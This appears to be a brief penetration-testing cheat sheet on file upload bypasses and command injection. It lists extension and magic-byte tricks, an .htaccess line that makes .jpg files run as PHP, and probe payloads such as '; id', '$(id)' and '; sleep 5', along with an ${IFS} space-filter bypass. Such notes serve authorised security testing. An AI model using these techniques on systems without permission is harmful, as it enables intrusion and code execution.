# File paths, uploads, and command input

LFI / traversal: [lfi.md](lfi.md) · [rfi.md](rfi.md)

## File upload
Find the saved path/handler. Upload success ≠ execution; request the file with a harmless marker.

- Extensions: `.phtml`, `.php5`, `.pHp`, double extensions.
- Magic bytes: prefix `GIF89a;`.
- Writable Apache `.htaccess`: `AddType application/x-httpd-php .jpg`

## Command injection
Compare each payload against a baseline:

```text
; id
| id
&& id
$(id)
; sleep 5
```
- Blind: repeat `sleep 5` vs baseline, or callback.
- Space filter: `${IFS}` (shell context only).
